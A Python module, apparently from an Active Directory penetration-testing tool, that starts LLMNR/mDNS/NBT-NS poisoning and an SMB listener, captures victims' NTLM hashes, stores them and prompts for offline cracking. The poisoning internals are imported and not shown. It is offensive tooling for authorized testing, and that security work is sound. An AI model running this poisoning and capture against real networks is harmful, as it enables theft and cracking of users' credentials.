"""CLI orchestration for the native LLMNR / mDNS / NBT-NS poisoning suite.

Replaces the legacy Responder integration with an entirely in-process,
async, MIT-compatible implementation (``services.poisoning`` +
``services.relay.smb_ntlm_capture``).

User flow stays identical: a single ``start_poisoning(shell)`` call brings
up the three poisoners *and* the SMB capture listener; every captured NTLM
hash is routed through the same ``save_ntlm_hash`` + ``ask_for_cracking``
pipeline that Responder used.

Threading model
---------------
The async stack (``PoisoningSuite`` + ``SMBNtlmCaptureSource``) needs an
event loop, so it runs in a dedicated background thread.  The shell remains
synchronous; cross-thread communication uses a ``threading.Event`` for
shutdown and ``asyncio.run_coroutine_threadsafe`` is not needed because
captures are surfaced via a sync queue drained by a second thread.
"""

from __future__ import annotations

import asyncio
import contextlib
import os
import queue as _queue
import threading
from dataclasses import dataclass, field
from typing import Any, Protocol

from adscan_internal import telemetry
from adscan_internal.cli.creds import save_ntlm_hash
from adscan_internal.rich_output import (
    mark_sensitive,
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_instruction,
    print_success,
    print_warning,
)


class PoisoningShell(Protocol):
    """Minimal shell surface required by the poisoning CLI."""

    interface: str | None
    myip: str | None
    domains_data: dict[str, dict[str, Any]]
    domains_dir: str
    cracking_dir: str
    current_workspace_dir: str | None

    def ask_for_cracking(
        self,
        hash_type: str,
        domain: str,
        hashes_file: str,
        *,
        confirm: bool = True,
    ) -> None:
        """Prompt the user to crack a captured hash."""
        ...


# ---------------------------------------------------------------------------
# Helpers — domain attribution
# ---------------------------------------------------------------------------


def _split_domain_user(raw_user: str) -> tuple[str, str | None]:
    """Split a ``DOMAIN\\user`` token; return (user, netbios_domain | None)."""

    if "\\" in raw_user:
        netbios, user = raw_user.split("\\", 1)
        return user, netbios
    return raw_user, None


def _resolve_full_domain(shell: PoisoningShell, netbios: str | None) -> str | None:
    """Map a NetBIOS short name to the full DNS domain registered in the workspace."""

    if not netbios:
        return None
    for domain, data in shell.domains_data.items():
        if data.get("netbios") == netbios:
            return domain
    return None


# ---------------------------------------------------------------------------
# Runtime state attached to the shell
# ---------------------------------------------------------------------------


@dataclass
class _PoisoningRuntime:
    """All state for a single ``start_poisoning`` invocation."""

    thread: threading.Thread
    capture_thread: threading.Thread
    stop_event: threading.Event
    capture_queue: _queue.Queue
    loop: asyncio.AbstractEventLoop | None = None
    processed_users: set[str] = field(default_factory=set)


# ---------------------------------------------------------------------------
# Public CLI entry points
# ---------------------------------------------------------------------------


def start_poisoning(shell: PoisoningShell) -> None:
    """Start the native poisoning suite + SMB capture listener.

    Idempotent: a second call while already running is a no-op with a
    notice.
    """

    if not shell.interface:
        print_error(
            "The network interface must be configured before poisoning can start"
        )
        return

    existing = getattr(shell, "_poisoning_runtime", None)
    if existing is not None and existing.thread.is_alive():
        print_warning("Poisoning suite is already running.")
        return

    stop_event = threading.Event()
    ready_event = threading.Event()
    error_holder: list[Exception] = []
    capture_queue: _queue.Queue = _queue.Queue()
    loop_holder: list[asyncio.AbstractEventLoop] = []

    interface = shell.interface
    advertised_ip = shell.myip

    def _async_thread() -> None:
        loop = asyncio.new_event_loop()
        loop_holder.append(loop)
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(
                _run_suite(
                    interface_name=interface,
                    advertised_ipv4=advertised_ip,
                    capture_queue=capture_queue,
                    stop_event=stop_event,
                    ready_event=ready_event,
                    error_holder=error_holder,
                )
            )
        finally:
            try:
                loop.run_until_complete(loop.shutdown_asyncgens())
            except Exception:  # noqa: BLE001
                pass
            loop.close()

    async_thread = threading.Thread(
        target=_async_thread, name="poisoning-async", daemon=True
    )
    async_thread.start()
    ready_event.wait(timeout=15.0)

    if error_holder:
        exc = error_holder[0]
        telemetry.capture_exception(exc)
        print_error(f"Poisoning suite failed to start: {exc}")
        stop_event.set()
        async_thread.join(timeout=5.0)
        return

    if not async_thread.is_alive():
        print_error("Poisoning suite exited before becoming ready.")
        return

    capture_thread = threading.Thread(
        target=_capture_consumer,
        args=(shell, capture_queue, stop_event),
        name="poisoning-capture-consumer",
        daemon=True,
    )
    capture_thread.start()

    runtime = _PoisoningRuntime(
        thread=async_thread,
        capture_thread=capture_thread,
        stop_event=stop_event,
        capture_queue=capture_queue,
        loop=loop_holder[0] if loop_holder else None,
    )
    shell._poisoning_runtime = runtime  # type: ignore[attr-defined]

    print_info("Native poisoning suite started (LLMNR / mDNS / NBT-NS + SMB capture).")
    print_instruction("Use 'stop_poisoning' to stop the listeners.")


def stop_poisoning(shell: PoisoningShell) -> None:
    """Stop broadcast poisoning, however it was launched.

    Poisoning reaches the operator through two launch paths that share the same
    listener substrate, and this command stops BOTH so the intuitive verb always
    works regardless of how poisoning started:

    * the **scan flow** (``start_auth`` / ``start_unauth``) launches it as a
      background job tracked by the ``BackgroundJobRegistry``
      (``kind="poisoning"``, one job per interface);
    * the manual ``poisoning`` command starts an **in-process suite** stored on
      ``shell._poisoning_runtime``.

    A clear count of what was stopped is reported. If nothing is running,
    the "not running" notice is shown.
    """

    stopped_scopes: list[str] = []
    total_captured = 0

    # (1) Registry-tracked background poisoning jobs (the scan-flow launch path).
    #     Stopping via the registry drives each runtime's stop() and marks the
    #     job terminal — the SAME path 'jobs stop <id>' uses.
    try:
        from adscan_internal.services.background_jobs.registry import (  # noqa: PLC0415
            get_or_create_registry,
        )

        registry = get_or_create_registry(shell)
        for job in registry.active():
            if job.kind != "poisoning":
                continue
            try:
                total_captured += int(job.result_summary.get("captured", 0) or 0)
            except (TypeError, ValueError):
                pass
            registry.stop(job.id)
            stopped_scopes.append(str(job.scope or "?"))
    except Exception as exc:  # noqa: BLE001 — a registry hiccup must not block the suite stop
        telemetry.capture_exception(exc)

    # (2) Legacy in-process suite (the manual `poisoning` command).
    runtime: _PoisoningRuntime | None = getattr(shell, "_poisoning_runtime", None)
    if runtime is not None:
        runtime.stop_event.set()
        # Sentinel so the capture consumer wakes up.
        runtime.capture_queue.put(None)
        runtime.thread.join(timeout=10.0)
        runtime.capture_thread.join(timeout=5.0)
        shell._poisoning_runtime = None  # type: ignore[attr-defined]
        stopped_scopes.append(str(getattr(shell, "interface", None) or "?"))

    if not stopped_scopes:
        print_warning("Poisoning is not running.")
        return

    # De-duplicate scopes (order-preserving) so a job + suite on the same
    # interface reads as one listener line, not two.
    scopes = list(dict.fromkeys(stopped_scopes))
    n = len(scopes)
    listener_word = "listener" if n == 1 else "listeners"
    captured_note = ""
    if total_captured:
        cred_word = "credential" if total_captured == 1 else "credentials"
        captured_note = f" {total_captured} {cred_word} captured this session."
    print_success(
        f"Stopped broadcast poisoning on {', '.join(scopes)} "
        f"({n} {listener_word})."
        f"{captured_note}"
    )


def clear_poisoning_state(shell: PoisoningShell) -> None:
    """Reset the per-session dedup set so the same victim can re-trigger crack prompts."""

    runtime: _PoisoningRuntime | None = getattr(shell, "_poisoning_runtime", None)
    if runtime is None:
        print_warning("Poisoning suite is not running — nothing to clear.")
        return
    runtime.processed_users.clear()
    print_success("Poisoning capture history cleared.")


# ---------------------------------------------------------------------------
# Background workers
# ---------------------------------------------------------------------------


async def _run_suite(
    *,
    interface_name: str,
    advertised_ipv4: str | None,
    capture_queue: _queue.Queue,
    stop_event: threading.Event,
    ready_event: threading.Event,
    error_holder: list[Exception],
) -> None:
    """Async coroutine that owns the lifecycle of suite + SMB capture."""

    from adscan_internal.services.poisoning import PoisonerConfig, PoisoningSuite  # noqa: PLC0415
    from adscan_internal.services.relay.smb_ntlm_capture import (  # noqa: PLC0415
        SMBNtlmCaptureConfig,
        SMBNtlmCaptureSource,
        extract_ntlm_hash,
    )

    poisoner_config = PoisonerConfig(
        interface_name=interface_name,
        our_ipv4=advertised_ipv4,
    )
    suite = PoisoningSuite(poisoner_config)
    capture_config = SMBNtlmCaptureConfig(
        listen_host=advertised_ipv4 or "0.0.0.0", listen_port=445
    )
    gssapi_queue: asyncio.Queue[object] = asyncio.Queue()
    capture_source = SMBNtlmCaptureSource(capture_config, gssapi_queue)

    try:
        await suite.start()
        await capture_source.start()
    except Exception as exc:  # noqa: BLE001
        error_holder.append(exc)
        with contextlib.suppress(Exception):
            await suite.stop()
        with contextlib.suppress(Exception):
            await capture_source.stop()
        ready_event.set()
        return

    ready_event.set()
    print_info_debug(f"[poisoning] suite + SMB capture ready on iface {interface_name}")

    try:
        while not stop_event.is_set():
            try:
                gssapi = await asyncio.wait_for(gssapi_queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                continue
            result = extract_ntlm_hash(gssapi)
            if result is None:
                continue
            capture_queue.put(
                {
                    "username": result.username or "",
                    "domain_netbios": result.domain or "",
                    "fullhash": result.fullhash,
                    "version": "v1" if result.ntlm_version == "NTLMv1" else "v2",
                }
            )
    finally:
        with contextlib.suppress(Exception):
            await capture_source.stop()
        with contextlib.suppress(Exception):
            await suite.stop()


def _capture_consumer(
    shell: PoisoningShell,
    capture_queue: _queue.Queue,
    stop_event: threading.Event,
) -> None:
    """Drain captures from the async thread, persist + prompt for cracking."""

    runtime: _PoisoningRuntime | None = getattr(shell, "_poisoning_runtime", None)
    while not stop_event.is_set():
        try:
            item = capture_queue.get(timeout=0.5)
        except _queue.Empty:
            continue
        if item is None:
            return
        try:
            _handle_capture(shell, runtime, item)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Error processing captured hash.")
            print_exception(show_locals=False, exception=exc)


_POISON_CAPTURED_NTLMV2_USERS_KEY = "poison_captured_ntlmv2_users"


def _record_poison_captured_ntlmv2_user(
    shell: PoisoningShell, domain: str, user: str
) -> None:
    """Mark ``user`` as a NetNTLMv2 principal captured via broadcast poisoning.

    Persists a JSON-safe per-domain list (never a set) in ``domains_data`` so a
    later crack-success in the cracking pipeline can distinguish a
    poisoner-captured NetNTLMv2 hash from any other NetNTLMv2 capture and
    materialize the ``PoisonCaptureNtlmv2Crack`` edge. Best-effort: provenance
    tracking must never break the capture flow.
    """
    user_clean = str(user or "").strip()
    if not user_clean:
        return
    try:
        domain_state = shell.domains_data.setdefault(domain, {})
        captured = domain_state.setdefault(_POISON_CAPTURED_NTLMV2_USERS_KEY, [])
        if not isinstance(captured, list):
            captured = []
            domain_state[_POISON_CAPTURED_NTLMV2_USERS_KEY] = captured
        if user_clean not in captured:
            captured.append(user_clean)
    except Exception as exc:  # noqa: BLE001 — provenance is best-effort
        telemetry.capture_exception(exc)


def _handle_capture(
    shell: PoisoningShell,
    runtime: _PoisoningRuntime | None,
    item: dict,
) -> None:
    """Persist one capture and prompt the user to crack it (once per user)."""

    user = item["username"]
    netbios = item["domain_netbios"] or None
    fullhash = item["fullhash"]
    version = item["version"]

    if not user:
        return

    # Dedup FIRST so a victim broadcasting repeatedly is handled once. Previously the
    # dedup lived AFTER the domain-resolve gate below, so an unmatched NetBIOS re-fired
    # the skip warning on every capture (~20x per user in a live segment).
    processed_users = runtime.processed_users if runtime is not None else set()
    if user in processed_users:
        return
    processed_users.add(user)

    # Never drop a captured hash: a NetNTLMv2/v1 is crackable regardless of workspace
    # context, and the domain match is only needed to decide WHERE to store the cracked
    # credential. When no workspace domain matches the captured NetBIOS (e.g. standalone
    # `poisoning` run before any domain is initialized), fall back to the NetBIOS short
    # name as the storage key and still crack. The in-scan wiring resolves the real FQDN.
    domain = _resolve_full_domain(shell, netbios)
    if not domain:
        domain = (netbios or "captured").strip().lower() or "captured"
        print_info(
            f"Captured hash for {mark_sensitive(user, 'user')} in NetBIOS "
            f"{mark_sensitive(netbios or '?', 'domain')} (no workspace domain match) "
            "— cracking under the captured name.",
            spacing="none",
        )

    if not save_ntlm_hash(shell, domain, version, user, fullhash):
        return  # already recorded for this user

    # Record provenance so a later crack-success can materialize the
    # PoisonCaptureNtlmv2Crack attack-graph edge (source = unauthenticated
    # principal). ONLY NetNTLMv2 — the NetNTLMv1 avenue has its own steps
    # (higher likelihood/impact) and is not folded in here. Bare capture is the
    # LLMNR/NBT-NS poisoning FINDING; the edge is materialized only when the
    # cracking pipeline recovers a usable credential.
    if version == "v2":
        _record_poison_captured_ntlmv2_user(shell, domain, user)

    print_success(f"New NTLM{version} hash captured:")
    print_info(f"User: {user}", spacing="none")
    if netbios:
        print_info(f"NetBIOS Domain: {netbios}", spacing="none")
    print_info(f"Full Domain: {mark_sensitive(domain, 'domain')}", spacing="none")
    print_info(f"Hash: {fullhash}", spacing="none")
    hash_file = os.path.join(
        shell.domains_dir, domain, shell.cracking_dir, f"{user}_hashes.NTLM{version}"
    )

    # Screenshot moment: first foothold credential captured via poisoning.
    # Augments (does not replace) the print_success above so existing logs
    # and tests stay backwards-compatible.
    try:
        from adscan_core.rich_output_collection import (
            DiscoveryCard,
            print_discovery_card,
        )

        masked_user = mark_sensitive(user, "user")
        masked_domain_full = mark_sensitive(domain, "domain")
        evidence_lines = [f"NTLM{version} hash captured via poisoning"]
        if netbios:
            evidence_lines.append(f"NetBIOS: {mark_sensitive(netbios, 'domain')}")
        evidence_lines.append("Hash written to workspace; offline cracking pending.")
        print_discovery_card(
            DiscoveryCard(
                severity="high",
                headline="FOOTHOLD CREDENTIAL CAPTURED",
                target=f"{masked_user}@{masked_domain_full}",
                evidence=tuple(evidence_lines),
                next_action=(
                    "Crack offline with weakpass/hashcat to convert into a "
                    "usable credential."
                ),
            )
        )
    except Exception as exc:  # pragma: no cover - presentation must never fail capture
        telemetry.capture_exception(exc)

    shell.ask_for_cracking(f"{user}.NTLM{version}", domain, hash_file)


# Suppress unused-import warning when Protocol is not picked up by ruff in older builds.
_ = _split_domain_user  # exported for tests/back-compat parsing of DOMAIN\user tokens
